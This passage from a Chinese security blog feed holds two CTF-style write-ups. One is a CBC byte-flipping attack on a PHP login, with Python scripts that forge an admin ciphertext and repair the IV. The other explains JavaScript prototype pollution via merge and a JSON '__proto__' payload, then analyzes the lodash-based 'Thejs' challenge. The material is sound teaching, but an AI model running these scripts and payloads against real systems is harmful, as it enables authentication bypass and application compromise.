unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password=waf((string)$_POST[<span class="string">'password'</span>]);</span><br><span class="line">  <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;You are not real admin!&lt;/p&gt;'</span>);<span class="comment">//当我们以admin账号登录时，程序会直接跳出</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="comment">//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码逻辑分析：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34sq6v97xj30y70madhv.jpg" alt=""></p>
<p>流程：如注册用户为abmin,密码也为abmin,则经过第一次登陆可有(没法复现了，只能借用一下图)</p>
<p>第一次进入可以得到的是IV以及base64加密后的Ciper，还有自己也可以看出反序列化数据</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image010.png" alt="è¿éåå¾çæè¿°"></p>
<p>AES为十六字节一组，所以分组情况如下：</p>
<p>a:2:{s:8:”username”;s:5:”abmin”;s:8:”password”;s:5:”abmin”;}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:”userna</span><br><span class="line">me”;s:5:”abmin”;</span><br><span class="line">s:8:”password”;s</span><br><span class="line">:5:”abmin”;&#125;</span><br></pre></td></tr></table></figure>

<p>翻转攻击逻辑，我们要将abmin翻转为admin，所以这里去修改上一组向量也就是<code>s:2:{s:8:”userna</code>来与middle值异或得到翻转后的值<code>me”;s:5:”abmin”;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">公式原理为</span><br><span class="line"></span><br><span class="line">middle[11]&#x3D;Ciper[11]^&#39;b&#39;</span><br><span class="line"></span><br><span class="line">构造Ciper[11]&#x3D;middle[11]^d</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">构造Ciper[11]&#x3D;Ciper[11]^&#39;b&#39;^&#39;d&#39;</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">nweCipher=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'bp抓到的cipher经过url解密后的值'</span>  </span><br><span class="line">cipher = base64.b64decode(cipher) <span class="comment">#先进行解密</span></span><br><span class="line">newCipher = cipher[<span class="number">0</span>:<span class="number">11</span>] + chr(ord(cipher[<span class="number">11</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'d'</span>)) + cipher[<span class="number">12</span>:] <span class="comment">#XOR运算修改</span></span><br><span class="line"><span class="keyword">print</span> base64.b64encode(newCipher)  <span class="comment">#再进行加密</span></span><br></pre></td></tr></table></figure>

<p>将得到的第一组攻击密文经过url编码后填入Cipher</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image013.png" alt="è¿éåå¾çæè¿°"></p>
<p>这里返回的代表无法进行反序列化，这是因为我们<strong>构造第一组攻击密文的时候破坏了密文本来的样子，这样经过aes解密后与之前属于正常密文的IV向量异或后就会得到不可见字符明文</strong>，这样就会无法反序列化。</p>
<p>所以，我们要对向量IV也要重新构造出符合攻击密文的向量，并且要一位一位的进行修复，这里可能会产生疑惑，<strong>为什么一位一位的进行修复</strong>，改的是密文的第十一位，只修复向量IV的第十一位不就好了?</p>
<p><strong>原因解释</strong>：</p>
<p><strong>在check_login函数中，函数逻辑是先对密文进行base64解密然后再aes解密，进行base64解密后的密文虽然是只有第十一位字符进行了攻击伪造，但是这个密文进行aes解密后得到的中间值逻辑就都乱了，并非只有中间值的第十一位发生改变，进而和原来的向量IV进行异或，所有得到的前十六位明文有很多乱码字符，而不是只有第十一位出错。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造逻辑：</span><br><span class="line">错误middle[i]&#x3D;ciper[i]^原来的IV[i]</span><br><span class="line"></span><br><span class="line">伪造IV[i]&#x3D;错误middle[i]^rightplain[i]</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">伪造IV[i]&#x3D;ciper[i]^原来的IV[i]^rightplain[i]</span><br></pre></td></tr></table></figure>

<p>这里的ciper[i]指的是那串无法进行反序列化的base64加密字段，需要先进行base64解密。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">cipher = <span class="string">''</span><span class="comment">#无法反序列化的字符串</span></span><br><span class="line">iv = <span class="string">''</span><span class="comment">#先前得到的IV</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))<span class="comment">#给cipher解密</span></span><br><span class="line">iv = base64.b64decode(iv) <span class="comment">#给先前的IV解密</span></span><br><span class="line">newIv = <span class="string">''</span></span><br><span class="line">right = <span class="string">''</span><span class="comment">#破坏前正确的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))<span class="comment">#一位位修复</span></span><br><span class="line">    <span class="keyword">print</span> urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image015.png" alt="è¿éåå¾çæè¿°"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://virtua11.github.io/2018/07/02/CBC字节翻转攻击/" target="_blank" rel="noopener">https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p>
<p><a href="https://skysec.top/2017/06/16/CBC字节翻转攻击/" target="_blank" rel="noopener">https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p>
<p><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/151167.html</a></p>
]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Prototype Pollution Attack</title>
    <url>/2019/09/25/Prototype-Pollution-Attack/</url>
    <content><![CDATA[<h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><h4 id="javascript对象"><a href="#javascript对象" class="headerlink" title="javascript对象"></a>javascript对象</h4><p>在Javascript中同样是有一切皆对象这种说法的，下面是在javascript中创建对象的三种方式</p>
<ul>
<li>普通创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">name</span>:<span class="string">'lihuaiqiu'</span>,<span class="string">'age'</span>,<span class="string">'19'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;&#125;  <span class="comment">//创建空对象</span></span><br></pre></td></tr></table></figure>

<ul>
<li>构造函数方法创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name=<span class="string">"liahuqiu"</span>;</span><br><span class="line">    <span class="keyword">this</span>.test=<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">23333</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person.prototype.a=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> person();</span><br><span class="line"><span class="built_in">console</span>.log(web.test());</span><br><span class="line"><span class="built_in">console</span>.log(web.a)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过object创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(a.c)</span><br></pre></td></tr></table></figure>

<h4 id="函数即对象思想"><a href="#函数即对象思想" class="headerlink" title="函数即对象思想"></a>函数即对象思想</h4><p>这里用instanceof来判断很明显，首先用较为官方的语言来说明一下instanceof</p>
<blockquote>
<p>instanceof运算符可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链</p>
</blockquote>
<p>就像这样</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">My</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">You</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">var</span> myOne = <span class="keyword">new</span> My();</span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> My)<span class="comment">//true //myone.__proto__===My.prototype</span></span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> You)<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>那么就可以通过下面这样的代码去验证函数即对象了</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFnk8.png" alt="nRFnk8.png"></p>
<p>由此可以test构造函数其实也是一种对象，即”函数即对象”。</p>
<p>那么函数与对象的属性有什么区别呢？csdn上有一个很好的图可以解释这个问题，如下:</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFRhD.png" alt="nRFRhD.png"></p>
<p>函数既可作为对象去解释又可作为函数去解释。</p>
<h4 id="proto-，constructor与prototype"><a href="#proto-，constructor与prototype" class="headerlink" title="__proto__，constructor与prototype"></a>__proto__，constructor与prototype</h4><p>首先把这三个属性的基本概念列举出来</p>
<ul>
<li><p>__proto__： <em>\</em>proto__是对象与对象之间连接的桥梁，即原型链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对象.__proto__&#x3D;构造器(构造函数).prototype</span><br></pre></td></tr></table></figure>

<p>构造器.prototype其实也是一个对象，为构造函数的原型对象，同样有__proto__属性，一直通过原型链__proto__最终可找到null。</p>
<p>在访问一个对象的某个属性时,当属性在实例中找不到，就会在属性中的原型对象中寻找。</p>
</li>
<li><p>prototype：prototype为函数特有的属性，而通过构造函数实例化的对象，默认是没有的。</p>
</li>
</ul>
<p>构造函数.prototype即为此构造函数实例化的原型对象，即 构造器(构造函数).prototype=对象.<em>_proto_\</em></p>
<p>其实prototype主要作用为解决构造函数的对象实例之间无法共享属性的缺点,实例如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">test.prototype.a=<span class="function"><span class="keyword">function</span> <span class="title">num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line">example1=<span class="keyword">new</span> test();</span><br><span class="line">example2=<span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(example1.a);   <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example2.a)    <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example1.a===example2.a);   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>constructor：通过实例化对象.constructor即可得到该实例化对象的构造函数，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person] //Person的原型对象的构造函数即为Person</span></span><br></pre></td></tr></table></figure>

<p>之前介绍的函数即对象思想在这里就可以解释一些代码了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.constructor) <span class="comment">// [Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>这四行代码说明了以下几点问题</p>
<ol>
<li>Funtion函数为Person函数的构造函数，这里就间接说明了函数即对象这个思想</li>
<li>Function函数同时也是自己的构造函数</li>
<li>Function函数同时为Object内置类的构造函数</li>
</ol>
<p><strong>所以，javascript中任意函数都是函数Function的实例对象，同时Function函数自身也为自己的实例对象</strong></p>
<h4 id="一些帮助理解的小例子"><a href="#一些帮助理解的小例子" class="headerlink" title="一些帮助理解的小例子"></a>一些帮助理解的小例子</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__===Person.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.constructor) <span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__==<span class="built_in">Object</span>.prototype) <span class="comment">//&#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.__proto__)  <span class="comment">//null</span></span><br></pre></td></tr></table></figure>

<p>来自csdn上的一个很棒的图片</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nfdXRK.png" alt="nfdXRK.png"></p>
<h4 id="Object与Function"><a href="#Object与Function" class="headerlink" title="Object与Function"></a>Object与Function</h4><p><code>Object</code>/<code>Function</code>既是对象，有自己的方法和属性，也是函数，可以作为构造函数，或许可以称作所谓的构造函数(函数对象)</p>
<h5 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h5><p>Function相对来说是一个很特别的函数/对象</p>
<ul>
<li>一般函数函数的prototype属性为一个原型对象，而Function的prototype属性为一个函数对象</li>
<li>所有函数的本身的__proto__属性指向Function的原型对象，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.__proto__===<span class="built_in">Function</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__===<span class="built_in">Function</span>.prototype)</span><br></pre></td></tr></table></figure>

<h5 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h5><ul>
<li>Object.prototype为所有对象原型链的终点且Object.prototype.__proto__为null</li>
</ul>
<p>一些帮助理解的小例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true </span></span><br><span class="line"><span class="built_in">Object</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype === <span class="built_in">Object</span>.__proto__ <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype) <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__) <span class="comment">// [Function]</span></span><br></pre></td></tr></table></figure>

<h4 id="普通对象与函数对象的一些区别"><a href="#普通对象与函数对象的一些区别" class="headerlink" title="普通对象与函数对象的一些区别"></a>普通对象与函数对象的一些区别</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test=&#123;<span class="string">'name'</span>:<span class="string">'lihuaiqiu'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test.__proto__===<span class="built_in">Object</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.__proto__===<span class="built_in">Object</span>.prototype)</span><br></pre></td></tr></table></figure>

<p>从上例中可明显看出函数对象与普通对象的区别是中间差了一个prototype获取原型对象的过程。</p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>污染实例如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test1=&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;</span><br><span class="line">test1.__proto__.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(test1.c) <span class="comment">//3</span></span><br><span class="line"><span class="keyword">var</span> test2=&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test2.a) <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(test2.c) <span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>在上面的代码中我们并没有在test2对象中设置c变量，但是却成功的打印出了c这是为什么呢？</p>
<p>因为我们在test1.__proto__中也就是object.prototype(<strong>Object构造函数的原型链</strong>)中设置了c,那么访问test2.c的时候首先在这个对象中找不到，再去test2.__proto__去找(也就是<strong>Object构造函数的原型链</strong>中去找)，正好找到c变量即可正常数据，这个访问流程也就是对JS原型链的诠释，下面我们具体打印一下Object来看一下</p>
<p><a href="https://imgchr.com/i/nfH5hq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/16/nfH5hq.png" alt="nfH5hq.png"></a></p>
<h3 id="原型链污染应用场景"><a href="#原型链污染应用场景" class="headerlink" title="原型链污染应用场景"></a>原型链污染应用场景</h3><p>这里用的是ph牛给的例子，在ph牛的文章中，有以下两个场景可能产生原型链污染</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>示例代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>这里本来的想法是通过o1.__proto__去操控Object.prototype进而污染o3，但是这个o2中的proto并没有被当作键值，可以打断点看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhtCr9.png" alt="nhtCr9.png"></p>
<p>这个__proto__其实已经被当作原型对象了，不过在看这个的时候我发现o2其实也是有点意思的，实验如下：</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhd2fx.png" alt="nhd2fx.png"></p>
<p>这里我们可以看到其实这个a中设置的”键值”已经被当作了a的原型对象了，相当于我们自己定义的原型对象，正常情况下a.__proto__就可以去操作Object.prototype了，但是这里是需要两次__proto__的，我们来看一下正常键值下我们通过__proto__来操控Object.prototype的亚子</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhBkOU.png" alt="nhBkOU.png"></p>
<p>这样就很清晰的明白了在__proto__键值下为什么要通过两次__proto__才能去操作Object.prototype</p>
<p>所以在ph牛给的例子中我们的键值相当于自定义了一个原型对象，故没法在新的对象中添加__proto__键值，所以就没法进行原型链污染了。那么怎么才能进行原型链污染呢，ph牛同样给出了例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>跟进分析一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhD33q.png" alt="nhD33q.png"></p>
<p>从上图我们可以看出来在merge之后成功触发原型链污染，成功修改Object.prototype造成对o3的污染。</p>
<p>那么我们可以清楚在JSON解析的情况下__proto__是会被当作键名的，而不再是类似之前那样被当作自己声明的原型了。</p>
<h3 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h3><p>主要部分代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//处理JSON数据</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>     <span class="comment">//设置一下Session</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err)) <span class="comment">//调用ejs进行渲染</span></span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//渲染内容</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="comment">//动态引入成员变量</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered) <span class="comment">//传回来</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;    <span class="comment">//将body中的数据传入sessioN中</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category <span class="comment">//渲染自己的选择</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(Example app listening on port <span class="number">3000</span>!))</span><br></pre></td></tr></table></figure>

<h4 id="程序主要逻辑分析"><a href="#程序主要逻辑分析" class="headerlink" title="程序主要逻辑分析"></a>程序主要逻辑分析</h4><p>我们通过两个选择框选择后这个框架会发生什么</p>
<p>首先判断请求方式是POST，然后进行下一步，通过lodash.merge，将我们body中的数值给data,然后session中储存这个data，这里也大概跟了一下lodash.merge，其原理应该就是正常的merge。</p>
<p>赋值完了之后进行渲染index,在渲染的适合，会跳到下面这个函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">  	<span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">    <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>也就是说这个才是渲染的核心，首先读取index.ejs的内容作为content,然后传入template模板化，最后进行动态引入一些配置变量，我们可以把compiled和options截出来具体看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nTBWLt.png" alt="nTBWLt.png"></p>
<p>这样我们的rendered的值就是渲染后的界面了，最后callback返回给用户。</p>
